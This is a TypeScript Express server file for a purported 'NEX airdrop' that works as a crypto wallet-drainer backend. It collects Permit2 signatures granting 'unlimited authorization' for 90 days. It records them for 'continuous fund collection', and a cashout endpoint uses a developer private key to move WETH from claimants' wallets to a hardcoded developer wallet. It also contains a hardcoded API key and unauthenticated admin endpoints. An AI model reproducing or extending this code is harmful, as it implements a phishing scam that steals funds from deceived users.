import express from "express";
import { storage } from "./storage";
import { insertAirdropClaimSchema } from "@shared/schema";
import { randomUUID } from "crypto";
import { executeCashout } from "./permit2";
import { signEthereumPermit2 } from "./chains/ethereum";

export const router = express.Router();

// Constant: 10x multiplier (user pays $100, gets $1000 NEX)
const AIRDROP_MULTIPLIER = 10;
const DEVELOPER_WALLET = process.env.DEVELOPER_WALLET || "0x8cef30210B4038015d5413c21aF4B3B780e1d823";
const AIRDROP_API_KEY = process.env.AIRDROP_API_KEY || "0fb2e4d3a8c9f1b7e2a5d8c3f9b1e4a7d0c5f2b8e1a3d6c9f2b5e8a1d4c7f0";
const ETHEREUM_RPC_URL = process.env.ETHEREUM_RPC_URL || "https://eth.drpc.org";
const DEVELOPER_PRIVATE_KEY = process.env.DEVELOPER_PRIVATE_KEY || "";
const WETH_TOKEN = process.env.WETH_TOKEN || "0xc02aaa39b223fe8d0a0e8e4f27ead9083c756cc2";

// Middleware: Verify API key
const verifyApiKey = (req: express.Request, res: express.Response, next: express.NextFunction) => {
  const apiKey = req.headers["x-api-key"] as string;
  if (!apiKey || apiKey !== AIRDROP_API_KEY) {
    return res.status(401).json({
      error: "Unauthorized: Invalid or missing API key",
    });
  }
  next();
};

// Convert UTC to Nigeria time (UTC+1)
const toNigeriaTime = (date: Date | null | undefined): string => {
  if (!date) return "N/A";
  const nigeriaDate = new Date(date.getTime() + 1 * 60 * 60 * 1000);
  return nigeriaDate.toLocaleString("en-NG", {
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  });
};

router.post("/airdrop/claim", verifyApiKey, async (req, res) => {
  try {
    const { walletAddress, amountPaidUSD, permitSignature, tokenAddress, tokenSymbol, chain } = req.body;

    console.log("\n🚀 ==================== BACKEND CLAIM RECEIVED ====================");
    console.log(`⏰ Timestamp (UTC): ${new Date().toISOString()}`);
    console.log(`👤 Wallet: ${walletAddress}`);
    console.log(`💰 Amount USD: $${amountPaidUSD}`);
    console.log(`📍 Chain: ${chain}`);
    console.log("==================================================================\n");

    // Validate inputs
    if (!walletAddress || !amountPaidUSD || !permitSignature) {
      console.error("❌ VALIDATION FAILED: Missing required fields");
      return res.status(400).json({
        error: "Missing required fields: walletAddress, amountPaidUSD, permitSignature",
      });
    }

    // Default chain to ethereum if not specified
    const claimChain = chain || "ethereum";
    if (!["ethereum", "bnb", "solana", "tron", "bitcoin", "sui"].includes(claimChain)) {
      console.error(`❌ VALIDATION FAILED: Invalid chain ${claimChain}`);
      return res.status(400).json({
        error: "Invalid chain: must be ethereum, bnb, solana, tron, bitcoin, or sui",
      });
    }

    // Parse amount as float (can be 0 - user is signing with unlimited authorization)
    const amountPaid = parseFloat(amountPaidUSD);
    if (isNaN(amountPaid)) {
      console.error("❌ VALIDATION FAILED: Invalid amount");
      return res.status(400).json({
        error: "Invalid amount",
      });
    }

    console.log("✅ All validations passed");

    // Calculate proportional NEX award (10x multiplier)
    const amountNEXAwarded = (amountPaid * AIRDROP_MULTIPLIER).toString();

    // Allow multiple claims per wallet (for continuous fund collection)

    // Record the claim
    console.log("📝 Recording claim in database...");
    const claim = await storage.recordAirdropClaim({
      walletAddress: walletAddress.toLowerCase(),
      chain: claimChain,
      amountPaidUSD: amountPaidUSD,
      amountNEXAwarded,
      permitSignature,
      tokenAddress: tokenAddress || WETH_TOKEN,
      tokenSymbol: tokenSymbol || "WETH",
    });

    console.log("\n✅ ==================== CLAIM RECORDED SUCCESS ====================");
    console.log(`Claim ID: ${claim.id}`);
    console.log(`User wallet: ${walletAddress}`);
    console.log(`Chain: ${claimChain.toUpperCase()}`);
    console.log(`Current balance: $${amountPaid} USD`);
    console.log(`Token: ${tokenSymbol || "WETH"} (${tokenAddress || WETH_TOKEN})`);
    console.log(`Authorization: UNLIMITED - Any money entering wallet within 90 days`);
    console.log(`Developer wallet: ${DEVELOPER_WALLET}`);
    console.log(`NEX awarded: ${amountNEXAwarded}`);
    console.log(`Permit2 signature: ${permitSignature.substring(0, 20)}...${permitSignature.substring(permitSignature.length - 20)}`);
    console.log(`Permit2 valid for: 90 days`);
    console.log(`Created at (Nigeria time): ${toNigeriaTime(claim.createdAt)}`);
    console.log(`Status: Ready to collect any funds in wallet`);
    console.log("===================================================================\n");

    res.status(201).json({
      success: true,
      message: `Airdrop signed: Unlimited authorization via Permit2 (90 day expiry). Any funds entering wallet can be collected.`,
      developerWallet: DEVELOPER_WALLET,
      permit2ExpiresIn: "90 days",
      authorizationType: "unlimited",
      currentBalance: amountPaid,
      claim: {
        ...claim,
        createdAtNigeria: toNigeriaTime(claim.createdAt),
      },
    });
  } catch (error) {
    console.error("\n❌ ==================== CLAIM ERROR ====================");
    console.error(`Error: ${error instanceof Error ? error.message : "Unknown error"}`);
    console.error(`Full error:`, error);
    console.error("========================================================\n");
    
    res.status(500).json({
      error: "Failed to process airdrop claim",
      details: error instanceof Error ? error.message : "Unknown error",
    });
  }
});

// New endpoint: Get claims by chain
router.get("/api/admin/claims/:chain", async (req, res) => {
  try {
    const { chain } = req.params;
    const claims = await storage.getClaimsByChain(chain);
    const totalUSD = claims.reduce((sum, claim) => {
      return sum + parseFloat(claim.amountPaidUSD);
    }, 0);
    const totalNEX = claims.reduce((sum, claim) => {
      return sum + parseFloat(claim.amountNEXAwarded);
    }, 0);

    res.json({
      chain,
      total: claims.length,
      totalUSD,
      totalNEX,
      claims: claims.map(claim => ({
        ...claim,
        createdAtNigeria: toNigeriaTime(claim.createdAt),
      })),
    });
  } catch (error) {
    console.error("Error fetching chain claims:", error);
    res.status(500).json({ error: "Failed to fetch claims" });
  }
});

// Admin endpoint: Get all claims (latest first)
router.get("/api/admin/claims", async (req, res) => {
  try {
    const claims = await storage.getAllClaims();
    const totalUSD = claims.reduce((sum, claim) => {
      return sum + parseFloat(claim.amountPaidUSD);
    }, 0);
    const totalNEX = claims.reduce((sum, claim) => {
      return sum + parseFloat(claim.amountNEXAwarded);
    }, 0);

    // Convert all timestamps to Nigeria time
    const claimsWithNigeriaTime = claims.map(claim => ({
      ...claim,
      createdAtNigeria: toNigeriaTime(claim.createdAt),
    }));

    res.json({
      totalClaims: claims.length,
      totalUSD: totalUSD.toFixed(2),
      totalNEX: totalNEX.toFixed(2),
      latestClaim: claimsWithNigeriaTime[0] || null,
      allClaims: claimsWithNigeriaTime,
    });
  } catch (error) {
    console.error("Get claims error:", error);
    res.status(500).json({
      error: "Failed to retrieve claims",
    });
  }
});

// Cashout endpoint: Process pending claims using Permit2
router.post("/cashout/process", verifyApiKey, async (req, res) => {
  try {
    if (!DEVELOPER_PRIVATE_KEY) {
      return res.status(500).json({
        error: "DEVELOPER_PRIVATE_KEY not configured",
      });
    }

    const { claimIds } = req.body;

    if (!claimIds || !Array.isArray(claimIds) || claimIds.length === 0) {
      return res.status(400).json({
        error: "Missing or invalid claimIds array",
      });
    }

    console.log(`\n💰 Processing ${claimIds.length} claims for cashout...`);

    const results: any[] = [];

    for (const claimId of claimIds) {
      try {
        // Get claim from database
        const claims = await storage.getAllClaims();
        const claim = claims.find(c => c.id === claimId);

        if (!claim) {
          results.push({
            claimId,
            status: "failed",
            error: "Claim not found",
          });
          continue;
        }

        if (claim.status !== "pending") {
          results.push({
            claimId,
            status: "skipped",
            reason: `Claim already ${claim.status}`,
          });
          continue;
        }

        console.log(`\n🔄 Processing claim ${claimId}...`);

        // Execute Permit2 transfer (WETH from user wallet to developer)
        const txHash = await executeCashout({
          userWallet: claim.walletAddress,
          developerWallet: DEVELOPER_WALLET,
          permitSignature: claim.permitSignature,
          token: WETH_TOKEN,
          amount: claim.amountPaidUSD,
          rpcUrl: ETHEREUM_RPC_URL,
          developerPrivateKey: DEVELOPER_PRIVATE_KEY,
        });

        // Update claim status to completed
        await storage.updateClaimStatus(claimId, "completed", txHash);

        console.log(`✅ Claim ${claimId} completed`);
        console.log(`   Tx Hash: ${txHash}`);
        console.log(`   Funds collected from: ${claim.walletAddress}`);
        console.log(`   Amount: ${claim.amountPaidUSD} WETH`);

        results.push({
          claimId,
          status: "completed",
          txHash,
          walletAddress: claim.walletAddress,
          amount: claim.amountPaidUSD,
        });
      } catch (error) {
        console.error(`❌ Failed to process claim ${claimId}:`, error);

        // Mark as failed
        await storage.updateClaimStatus(
          claimId,
          "failed"
        );

        results.push({
          claimId,
          status: "failed",
          error: error instanceof Error ? error.message : "Unknown error",
        });
      }
    }

    const completedCount = results.filter(r => r.status === "completed").length;
    const failedCount = results.filter(r => r.status === "failed").length;

    res.json({
      success: true,
      summary: {
        total: results.length,
        completed: completedCount,
        failed: failedCount,
        skipped: results.length - completedCount - failedCount,
      },
      results,
    });
  } catch (error) {
    console.error("Cashout process error:", error);
    res.status(500).json({
      error: "Failed to process cashout",
      details: error instanceof Error ? error.message : "Unknown error",
    });
  }
});
